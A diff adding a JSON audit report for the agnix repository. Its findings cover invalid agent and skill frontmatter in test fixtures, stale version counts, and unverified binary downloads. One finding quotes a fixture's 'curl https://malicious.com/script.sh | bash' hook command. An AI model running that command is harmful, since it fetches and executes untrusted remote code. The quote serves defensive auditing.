@@ -1,0 +1,1165 @@
+{
+  "project": "agent-sh/agnix",
+  "score_threshold": 70,
+  "r51_enabled": false,
+  "summary": {
+    "total_files": 51,
+    "average_score": 64,
+    "pass_count": 0,
+    "fail_count": 0
+  },
+  "files": [
+    {
+      "path": "npm/install.js",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "SEC-unverified-download",
+          "severity": "medium",
+          "line": 153,
+          "message": "https.get downloads binary from GitHub releases; no checksum verification before renaming and chmod +x."
+        }
+      ]
+    },
+    {
+      "path": "npm/package.json",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "SEC-postinstall-script",
+          "severity": "high",
+          "line": 41,
+          "message": "postinstall script 'node install.js' automatically downloads a platform binary from GitHub releases during npm install without checksum verification; supply-chain risk if GitHub releases are compromised."
+        }
+      ]
+    },
+    {
+      "path": "plugin/.claude-plugin/plugin.json",
+      "type": "manifest",
+      "score": null,
+      "findings": [
+        {
+          "rule": "CC-stale-count",
+          "severity": "medium",
+          "line": 3,
+          "message": "plugin.json version is 0.16.1 while npm/package.json is 0.20.0; plugin metadata is 4 minor versions behind."
+        }
+      ]
+    },
+    {
+      "path": "plugin/agents/agnix-agent.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "R14",
+          "severity": "low",
+          "line": null,
+          "message": "No example interaction blocks showing expected agent behavior."
+        }
+      ]
+    },
+    {
+      "path": "plugin/commands/agnix.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "CC-stale-count",
+          "severity": "low",
+          "line": 3,
+          "message": "Description cites '405 rules' but CLAUDE.md documents 414 rules; npm package is v0.20.0."
+        },
+        {
+          "rule": "R14",
+          "severity": "low",
+          "line": null,
+          "message": "Has code-block output examples but no agent-style interaction example turns."
+        }
+      ]
+    },
+    {
+      "path": "plugin/skills/agnix/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "CC-stale-count",
+          "severity": "low",
+          "line": 3,
+          "message": "Description cites '405 rules' but CLAUDE.md documents 414 rules."
+        },
+        {
+          "rule": "CC-orphan-component",
+          "severity": "low",
+          "line": null,
+          "message": "plugin/skills/agnix/SKILL.md has argument-hint but no allowed-tools; skills/agnix/SKILL.md has allowed-tools but no argument-hint; neither is complete relative to the other."
+        },
+        {
+          "rule": "R12",
+          "severity": "low",
+          "line": null,
+          "message": "No model field declared; inherits caller's model tier rather than specifying the appropriate execution model."
+        }
+      ]
+    },
+    {
+      "path": "scripts/check-tool-releases.sh",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "SEC-external-network-call",
+          "severity": "medium",
+          "line": 107,
+          "message": "curl -sL fetches content from html_url values in .github/tool-release-baselines.json; URLs are config-controlled but content is not validated before use in issue bodies."
+        }
+      ]
+    },
+    {
+      "path": "scripts/download.sh",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "SEC-unverified-download",
+          "severity": "medium",
+          "line": 135,
+          "message": "curl downloads binary from GitHub releases; no SHA256 or GPG signature verification before extracting and using the binary."
+        }
+      ]
+    },
+    {
+      "path": "scripts/glm-extract.js",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "SEC-external-api-call",
+          "severity": "medium",
+          "line": 207,
+          "message": "Up to 80K chars of stdin content (sourced from external repos in tool-release-watch workflow) is sent to api.z.ai GLM API; no data redaction or sanitization before transmission."
+        }
+      ]
+    },
+    {
+      "path": "skills/agnix/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "CC-stale-count",
+          "severity": "low",
+          "line": 3,
+          "message": "Description cites '405 rules' but CLAUDE.md documents 414 rules."
+        },
+        {
+          "rule": "R12",
+          "severity": "low",
+          "line": null,
+          "message": "No model field declared."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/copilot-invalid/.github/agents/invalid-infer-null.agent.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "medium",
+          "line": 3,
+          "message": "Missing name; infer: null is not a valid boolean value."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/copilot-invalid/.github/agents/invalid-infer-type.agent.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "medium",
+          "line": 3,
+          "message": "Missing name; infer field is string \"auto\" instead of required boolean type."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/copilot-invalid/.github/agents/invalid-target.agent.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "high",
+          "line": null,
+          "message": "Missing name field; target value 'desktop' is not a valid Copilot target (valid: vscode/github/shared)."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/copilot-invalid/.github/agents/missing-description.agent.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "high",
+          "line": null,
+          "message": "Agent missing both required name and description fields; cannot be registered."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/copilot-invalid/.github/agents/unknown-field.agent.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "medium",
+          "line": 3,
+          "message": "Missing name; unknown field 'mystery-field' present in frontmatter."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/copilot-invalid/.github/agents/unsupported-fields.agent.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "medium",
+          "line": 3,
+          "message": "Missing name; model: gpt-4.1 is not a valid Claude model; argument-hint is not a Copilot agent field."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/copilot-invalid/.github/hooks/hooks.json",
+      "type": "hook-config",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 6,
+          "message": "Hook event 'notRealEvent' is not a valid Copilot hook event name."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/copilot-too-long/.github/agents/too-long.agent.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "high",
+          "line": null,
+          "message": "Copilot agent missing required name field."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/copilot/.github/agents/reviewer.agent.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "high",
+          "line": null,
+          "message": "Copilot agent missing required name field; will fail to register."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/cursor-invalid/agent-cur014/.cursor/agents/reviewer.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 2,
+          "message": "name: ReviewerAgent is PascalCase (should be kebab-case); description: 123 is numeric; readonly: \"true\" is string (must be bool)."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/bypass-permissions.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "high",
+          "line": 4,
+          "message": "permissionMode: bypassPermissions disables all safety checks and is a security risk."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/invalid-disallowed-tool.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-undeclared-tool",
+          "severity": "medium",
+          "line": 5,
+          "message": "disallowedTools includes NotARealTool which is not a valid Claude Code tool."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/invalid-hooks.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 5,
+          "message": "Hook event 'BadEvent' is not a valid Claude Code hook event name."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/invalid-memory.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 4,
+          "message": "memory: 'global' is not a valid scope; valid values are project, thread, or none."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/invalid-model.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 4,
+          "message": "model: gpt-4 is not a valid Claude Code model; use sonnet, opus, haiku, or inherit."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/invalid-permission.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 4,
+          "message": "permissionMode: admin is not a valid value; valid: default, acceptEdits, dontAsk, bypassPermissions, plan, delegate."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/invalid-skill-format.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 5,
+          "message": "Skill references 'MySkill' and 'has_underscore' violate kebab-case naming requirement."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/invalid-tool-name.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-undeclared-tool",
+          "severity": "medium",
+          "line": 5,
+          "message": "tools list includes UnknownTool and FakeRead which are not valid Claude Code tools."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/missing-description.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "high",
+          "line": null,
+          "message": "Agent missing required description field."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/missing-frontmatter.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "high",
+          "line": null,
+          "message": "Agent file has no YAML frontmatter at all; name and description are absent."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/missing-name.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "high",
+          "line": null,
+          "message": "Agent missing required name field."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/missing-skill.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-broken-reference",
+          "severity": "medium",
+          "line": 4,
+          "message": "skills: [nonexistent-skill] references a skill that does not exist in the repository."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/agents/tool-conflict.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 8,
+          "message": "Bash appears in both tools and disallowedTools; this is a contradiction and may cause undefined behavior."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/gemini-agents/.gemini/agents/broken.md",
+      "type": "?",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 7,
+          "message": "MCP server auth type 'basic-auth' is not a valid auth type; Gemini CLI only supports google-credentials."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/hooks/dangerous-commands/settings.json",
+      "type": "hook-config",
+      "score": null,
+      "findings": [
+        {
+          "rule": "SEC-curl-pipe-sh",
+          "severity": "critical",
+          "line": 8,
+          "message": "Contains 'curl https://malicious.com/script.sh | bash' which would execute arbitrary remote code."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/hooks/mcp_tool_missing_fields.json",
+      "type": "hook-config",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "high",
+          "line": 6,
+          "message": "mcp_tool hook missing required server and tool fields; hook cannot execute."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/hooks/missing-command-field/settings.json",
+      "type": "hook-config",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "high",
+          "line": 7,
+          "message": "command type hook missing required command field; hook cannot execute."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/hooks/missing-prompt-field/settings.json",
+      "type": "hook-config",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 7,
+          "message": "prompt type hook missing required prompt field."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/hooks/missing-type-field/settings.json",
+      "type": "hook-config",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "high",
+          "line": 7,
+          "message": "Hook objects missing required type field; hook cannot execute."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/hooks/unknown-hook-type/settings.json",
+      "type": "hook-config",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 7,
+          "message": "Hook type 'webhook' is not a valid Claude Code hook type; valid types are command, prompt, agent, mcp_tool."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/skills/agent-without-context/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 4,
+          "message": "agent: Explore requires context: fork to have effect; without it the field is ignored."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/skills/context-without-agent/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 4,
+          "message": "context: fork requires an agent field; omitting it makes the fork context unroutable."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/skills/invalid-agent/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 5,
+          "message": "agent: Invalid_Agent contains underscore; must be built-in name or kebab-case custom name."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/skills/invalid-context/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 4,
+          "message": "context: split is not a valid value; only 'fork' is supported."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/skills/invalid-hooks/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 5,
+          "message": "Hook event 'InvalidEvent' is not a valid Claude Code hook event name."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/skills/invalid-model/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 4,
+          "message": "model: gpt-4 is not a valid value for this field; use sonnet, opus, haiku, or inherit."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/skills/invalid-name/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 2,
+          "message": "name: invalid_name contains underscore; skill names must be kebab-case."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/skills/string-boolean-disable/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 4,
+          "message": "disable-model-invocation: \"true\" is a string; must be boolean true."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/skills/string-boolean-invocable/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-invalid-field-value",
+          "severity": "medium",
+          "line": 4,
+          "message": "user-invocable: \"false\" is a string; must be boolean false."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/invalid/skills/unknown-tool/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-undeclared-tool",
+          "severity": "medium",
+          "line": 4,
+          "message": "allowed-tools includes FakeTool and UnknownTool which are not valid Claude Code tools."
+        }
+      ]
+    },
+    {
+      "path": "tests/fixtures/skills/missing-frontmatter/SKILL.md",
+      "type": "skill",
+      "score": null,
+      "findings": [
+        {
+          "rule": "BUG-missing-frontmatter",
+          "severity": "high",
+          "line": null,
+          "message": "SKILL.md file has no YAML frontmatter; name and description are absent."
+        }
+      ]
+    }
+  ],
+  "history": [
+    {
+      "timestamp": "2026-04-27T02:35:14Z",
+      "average_score": 64,
+      "kind": "initial_audit"
+    }
+  ],
+  "cross_component": {
+    "nodes": [],
+    "edges": []
+  },
+  "vocabulary": null,
+  "vocab_drift": {
+    "candidates": []
+  },
+  "findings": [
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/copilot-invalid/.github/agents/missing-description.agent.md",
+      "line": null,
+      "message": "Agent missing both required name and description fields; cannot be registered."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/missing-frontmatter.md",
+      "line": null,
+      "message": "Agent file has no YAML frontmatter at all; name and description are absent."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/skills/missing-frontmatter/SKILL.md",
+      "line": null,
+      "message": "SKILL.md file has no YAML frontmatter; name and description are absent."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/copilot/.github/agents/reviewer.agent.md",
+      "line": null,
+      "message": "Copilot agent missing required name field; will fail to register."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/copilot-too-long/.github/agents/too-long.agent.md",
+      "line": null,
+      "message": "Copilot agent missing required name field."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/copilot-invalid/.github/agents/invalid-target.agent.md",
+      "line": null,
+      "message": "Missing name field; target value 'desktop' is not a valid Copilot target (valid: vscode/github/shared)."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/copilot-invalid/.github/agents/invalid-infer-type.agent.md",
+      "line": 3,
+      "message": "Missing name; infer field is string \"auto\" instead of required boolean type."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/copilot-invalid/.github/agents/unknown-field.agent.md",
+      "line": 3,
+      "message": "Missing name; unknown field 'mystery-field' present in frontmatter."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/copilot-invalid/.github/agents/unsupported-fields.agent.md",
+      "line": 3,
+      "message": "Missing name; model: gpt-4.1 is not a valid Claude model; argument-hint is not a Copilot agent field."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/copilot-invalid/.github/agents/invalid-infer-null.agent.md",
+      "line": 3,
+      "message": "Missing name; infer: null is not a valid boolean value."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/missing-description.md",
+      "line": null,
+      "message": "Agent missing required description field."
+    },
+    {
+      "rule": "BUG-missing-frontmatter",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/missing-name.md",
+      "line": null,
+      "message": "Agent missing required name field."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/tool-conflict.md",
+      "line": 8,
+      "message": "Bash appears in both tools and disallowedTools; this is a contradiction and may cause undefined behavior."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/invalid-hooks.md",
+      "line": 5,
+      "message": "Hook event 'BadEvent' is not a valid Claude Code hook event name."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/invalid-memory.md",
+      "line": 4,
+      "message": "memory: 'global' is not a valid scope; valid values are project, thread, or none."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/invalid-model.md",
+      "line": 4,
+      "message": "model: gpt-4 is not a valid Claude Code model; use sonnet, opus, haiku, or inherit."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/bypass-permissions.md",
+      "line": 4,
+      "message": "permissionMode: bypassPermissions disables all safety checks and is a security risk."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/invalid-permission.md",
+      "line": 4,
+      "message": "permissionMode: admin is not a valid value; valid: default, acceptEdits, dontAsk, bypassPermissions, plan, delegate."
+    },
+    {
+      "rule": "BUG-broken-reference",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/missing-skill.md",
+      "line": 4,
+      "message": "skills: [nonexistent-skill] references a skill that does not exist in the repository."
+    },
+    {
+      "rule": "BUG-undeclared-tool",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/invalid-tool-name.md",
+      "line": 5,
+      "message": "tools list includes UnknownTool and FakeRead which are not valid Claude Code tools."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/invalid-skill-format.md",
+      "line": 5,
+      "message": "Skill references 'MySkill' and 'has_underscore' violate kebab-case naming requirement."
+    },
+    {
+      "rule": "BUG-undeclared-tool",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/agents/invalid-disallowed-tool.md",
+      "line": 5,
+      "message": "disallowedTools includes NotARealTool which is not a valid Claude Code tool."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/gemini-agents/.gemini/agents/broken.md",
+      "line": 7,
+      "message": "MCP server auth type 'basic-auth' is not a valid auth type; Gemini CLI only supports google-credentials."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/cursor-invalid/agent-cur014/.cursor/agents/reviewer.md",
+      "line": 2,
+      "message": "name: ReviewerAgent is PascalCase (should be kebab-case); description: 123 is numeric; readonly: \"true\" is string (must be bool)."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/skills/invalid-hooks/SKILL.md",
+      "line": 5,
+      "message": "Hook event 'InvalidEvent' is not a valid Claude Code hook event name."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/skills/invalid-model/SKILL.md",
+      "line": 4,
+      "message": "model: gpt-4 is not a valid value for this field; use sonnet, opus, haiku, or inherit."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/skills/invalid-context/SKILL.md",
+      "line": 4,
+      "message": "context: split is not a valid value; only 'fork' is supported."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/skills/string-boolean-disable/SKILL.md",
+      "line": 4,
+      "message": "disable-model-invocation: \"true\" is a string; must be boolean true."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/skills/invalid-name/SKILL.md",
+      "line": 2,
+      "message": "name: invalid_name contains underscore; skill names must be kebab-case."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/skills/invalid-agent/SKILL.md",
+      "line": 5,
+      "message": "agent: Invalid_Agent contains underscore; must be built-in name or kebab-case custom name."
+    },
+    {
+      "rule": "BUG-undeclared-tool",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/skills/unknown-tool/SKILL.md",
+      "line": 4,
+      "message": "allowed-tools includes FakeTool and UnknownTool which are not valid Claude Code tools."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/skills/context-without-agent/SKILL.md",
+      "line": 4,
+      "message": "context: fork requires an agent field; omitting it makes the fork context unroutable."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/skills/agent-without-context/SKILL.md",
+      "line": 4,
+      "message": "agent: Explore requires context: fork to have effect; without it the field is ignored."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/skills/string-boolean-invocable/SKILL.md",
+      "line": 4,
+      "message": "user-invocable: \"false\" is a string; must be boolean false."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/hooks/unknown-hook-type/settings.json",
+      "line": 7,
+      "message": "Hook type 'webhook' is not a valid Claude Code hook type; valid types are command, prompt, agent, mcp_tool."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/hooks/mcp_tool_missing_fields.json",
+      "line": 6,
+      "message": "mcp_tool hook missing required server and tool fields; hook cannot execute."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/hooks/missing-command-field/settings.json",
+      "line": 7,
+      "message": "command type hook missing required command field; hook cannot execute."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/hooks/missing-type-field/settings.json",
+      "line": 7,
+      "message": "Hook objects missing required type field; hook cannot execute."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/invalid/hooks/missing-prompt-field/settings.json",
+      "line": 7,
+      "message": "prompt type hook missing required prompt field."
+    },
+    {
+      "rule": "BUG-invalid-field-value",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "tests/fixtures/copilot-invalid/.github/hooks/hooks.json",
+      "line": 6,
+      "message": "Hook event 'notRealEvent' is not a valid Copilot hook event name."
+    },
+    {
+      "rule": "CC-stale-count",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "plugin/.claude-plugin/plugin.json",
+      "line": 3,
+      "message": "plugin.json version is 0.16.1 while npm/package.json is 0.20.0; plugin metadata is 4 minor versions behind."
+    },
+    {
+      "rule": "CC-stale-count",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "plugin/commands/agnix.md",
+      "line": 3,
+      "message": "Description cites '405 rules' but CLAUDE.md documents 414 rules; npm package is v0.20.0."
+    },
+    {
+      "rule": "CC-stale-count",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "plugin/skills/agnix/SKILL.md",
+      "line": 3,
+      "message": "Description cites '405 rules' but CLAUDE.md documents 414 rules."
+    },
+    {
+      "rule": "CC-stale-count",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "skills/agnix/SKILL.md",
+      "line": 3,
+      "message": "Description cites '405 rules' but CLAUDE.md documents 414 rules."
+    },
+    {
+      "rule": "CC-orphan-component",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "plugin/skills/agnix/SKILL.md",
+      "line": null,
+      "message": "plugin/skills/agnix/SKILL.md has argument-hint but no allowed-tools; skills/agnix/SKILL.md has allowed-tools but no argument-hint; neither is complete relative to the other."
+    },
+    {
+      "rule": "SEC-postinstall-script",
+      "severity": "high",
+      "confidence": "medium",
+      "file": "npm/package.json",
+      "line": 41,
+      "message": "postinstall script 'node install.js' automatically downloads a platform binary from GitHub releases during npm install without checksum verification; supply-chain risk if GitHub releases are compromised."
+    },
+    {
+      "rule": "SEC-unverified-download",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "scripts/download.sh",
+      "line": 135,
+      "message": "curl downloads binary from GitHub releases; no SHA256 or GPG signature verification before extracting and using the binary."
+    },
+    {
+      "rule": "SEC-unverified-download",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "npm/install.js",
+      "line": 153,
+      "message": "https.get downloads binary from GitHub releases; no checksum verification before renaming and chmod +x."
+    },
+    {
+      "rule": "SEC-external-network-call",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "scripts/check-tool-releases.sh",
+      "line": 107,
+      "message": "curl -sL fetches content from html_url values in .github/tool-release-baselines.json; URLs are config-controlled but content is not validated before use in issue bodies."
+    },
+    {
+      "rule": "SEC-external-api-call",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "scripts/glm-extract.js",
+      "line": 207,
